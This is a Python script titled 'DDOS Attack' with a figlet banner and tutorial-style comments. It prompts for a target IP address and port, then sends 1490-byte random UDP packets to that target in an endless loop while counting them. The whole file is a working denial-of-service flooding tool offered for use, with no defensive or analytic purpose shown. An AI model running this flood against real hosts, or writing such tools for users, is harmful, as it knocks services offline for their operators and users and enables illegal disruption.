import sys
import os 
import time 
import socket
import random 
from datetime import datetime
import color


# Time Format And Calculate The Time Info
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Creating The Socket 
sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
byte = random._urandom(1490)

#print(byte)
#exit()


""" Clear the Screen , Creating A Method Which Will Clear The Screen ! """
def cls():
    os.system("clear")
""" Creating A Method Which Will Print The Logo In The Screen When We Will Run The Script In the Terminal , Let's Create It """


def Logo(isLogo=False):
    """ It Will Print The Logo If The Parameter isLogo Will Be true , Otherwise It Will Print Only Information """
    os.system("clear")
    if isLogo:
        os.system("figlet -s DDOS-Attack | lolcat")
    print(color.LIGHT_CYAN+color.BOLD+" _______________________________________________")
    print(color.GREEN+color.BOLD+"\n [!] "+color.LIGHT_CYAN+color.BOLD+"Tools Name          :  "+color.YELLOW+color.BOLD," DDOS Attack")
    print(color.GREEN+color.BOLD+"\n [!] "+color.LIGHT_CYAN+color.BOLD+"Developer & Author  :  "+color.YELLOW+color.BOLD," Ghs Julian")
    print(color.LIGHT_CYAN+color.BOLD+" _______________________________________________")

""" Now Let's create Some Input Which Will Accept The User Input If The User Give The Correct Information It Will Store The Information In The Variable. """
cls()
Logo(True)

IP = str(input(color.LIGHT_CYAN+color.BOLD+"\n [+] "+color.GREEN+color.BOLD+"Enter IP Address  :  "+color.YELLOW+color.BOLD))
PORT = int(input(color.LIGHT_CYAN+color.BOLD+"\n [+] "+color.GREEN+color.BOLD+"Enter PORT Number  :  "+color.YELLOW+color.BOLD))

print("\n")

""" Here Will Start The Attack Using While Loop """
sent = 0
while True:
    sock.sendto(byte, (IP,PORT))
    sent = sent + 1
    print(color.RED+color.BOLD+" [+] "+color.LIGHT_CYAN+color.BOLD+f"Sent {color.BOLD+color.YELLOW+str(sent)} To {color.BOLD+color.GREEN+str(IP)+color.BOLD+color.LIGHT_CYAN} Through {color.BOLD+color.RED+str(PORT)} ",end="\r")
    if PORT == 65534:
        exit()
